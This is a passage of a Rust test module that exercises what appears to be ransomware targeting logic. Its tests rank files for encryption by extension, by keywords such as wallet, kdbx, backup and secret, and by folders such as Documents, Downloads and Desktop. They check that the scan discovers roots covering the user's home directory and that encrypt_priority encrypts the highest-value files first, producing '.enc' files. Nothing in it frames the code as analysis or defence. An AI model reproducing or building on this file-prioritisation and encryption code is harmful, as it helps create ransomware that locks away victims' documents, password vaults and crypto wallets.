        assert_eq!(tier_for(Path::new("Song.MP3")), 2);
    }

    #[test]
    fn keywords_promote_unknown_or_extensionless_files() {
        assert!(tier_from_keywords(Path::new("backup_2024.whatever")));
        assert!(tier_from_keywords(Path::new("secret_notes")));
        assert!(tier_from_keywords(Path::new("my_wallet.dat.bak")));
        assert!(tier_from_keywords(Path::new("kdbx_master")));
        assert!(!tier_from_keywords(Path::new("unrelated.zzz")));
    }

    #[test]
    fn keyword_boost_is_case_insensitive() {
        assert!(tier_from_keywords(Path::new("BACKUP_2024.whatever")));
    }

    #[test]
    fn keyword_never_demotes_known_extension() {
        // Tier-0 extension stays 0 regardless of keywords.
        assert_eq!(tier_of(Path::new("report.pdf")), 0);
        // Keyword promotes a tier-1 extension to 0.
        assert_eq!(tier_of(Path::new("wallet.zip")), 0);
        // Unknown extension + no keyword stays 3.
        assert_eq!(tier_of(Path::new("qwerty.xyz")), 3);
    }

    #[test]
    fn directory_boost_bumps_one_step() {
        assert_eq!(tier_of(Path::new("Documents/qwerty.xyz")), 2);
        assert_eq!(tier_of(Path::new("Downloads/thing.zzz")), 2);
        assert_eq!(tier_of(Path::new("Desktop/archive.zip")), 0);
        // Never below tier 0.
        assert_eq!(tier_of(Path::new("Desktop/report.pdf")), 0);
        assert_eq!(tier_of(Path::new("elsewhere/qwerty.xyz")), 3);
    }

    #[test]
    fn sort_priority_orders_by_deferred_then_tier_then_size() {
        let mut v = vec![
            FileEntry { path: PathBuf::from("big_t1"), size: 100, tier: 1, deferred: false },
            FileEntry { path: PathBuf::from("small_t0"), size: 1, tier: 0, deferred: false },
            FileEntry { path: PathBuf::from("def_t0"), size: 5, tier: 0, deferred: true },
            FileEntry { path: PathBuf::from("small_t1"), size: 10, tier: 1, deferred: false },
        ];
        sort_priority(&mut v);
        let order: Vec<String> =
            v.iter().map(|e| e.path.to_string_lossy().into_owned()).collect();
        assert_eq!(order, vec!["small_t0", "small_t1", "big_t1", "def_t0"]);
    }

    #[test]
    fn discover_roots_are_non_empty_and_cover_home() {
        let roots = discover_roots();
        assert!(!roots.is_empty(), "discover_roots returned nothing");
        let home = std::env::var("USERPROFILE").or_else(|_| std::env::var("HOME"));
        if let Ok(home) = home {
            let home = PathBuf::from(home);
            assert!(
                roots
                    .iter()
                    .any(|r| r == &home || home.starts_with(r) || r.starts_with(&home)),
                "no root covers home {:?}: {:?}",
                home,
                roots
            );
        }
    }

    #[test]
    fn inventory_collects_encryptable_files_with_tiers() {
        let dir = tempdir().unwrap();
        let base = dir.path();
        std::fs::create_dir_all(base.join("Documents")).unwrap();
        std::fs::write(base.join("Documents/report.docx"), b"doc").unwrap();
        std::fs::write(base.join("Documents/notes.txt"), b"txt excluded").unwrap();
        std::fs::write(base.join("plain.bin"), b"bin").unwrap();
        std::fs::write(base.join("secret_notes"), b"no ext").unwrap();

        let entries = inventory(&[base.to_path_buf()]);
        let mut names: Vec<(String, u8)> = entries
            .iter()
            .map(|e| {
                (
                    e.path.file_name().unwrap().to_string_lossy().into_owned(),
                    e.tier,
                )
            })
            .collect();
        names.sort();
        assert_eq!(
            names,
            vec![
                ("plain.bin".to_string(), 3),
                ("report.docx".to_string(), 0),
                ("secret_notes".to_string(), 0),
            ]
        );
    }

    #[test]
    fn encrypt_priority_locks_tier0_first() {
        let dir = tempdir().unwrap();
        let base = dir.path();
        std::fs::create_dir_all(base.join("code")).unwrap();
        std::fs::write(base.join("report.pdf"), b"doc").unwrap();
        std::fs::write(base.join("code/main.rs"), b"fn main(){}").unwrap();

        let entries = inventory(&[base.to_path_buf()]);
        assert_eq!(entries.len(), 2);
        let key = random_key();
        let n = encrypt_priority(entries, &key);
        assert_eq!(n, 2);
        assert!(base.join("report.pdf.enc").exists());
        assert!(base.join("code/main.rs.enc").exists());
    }
}
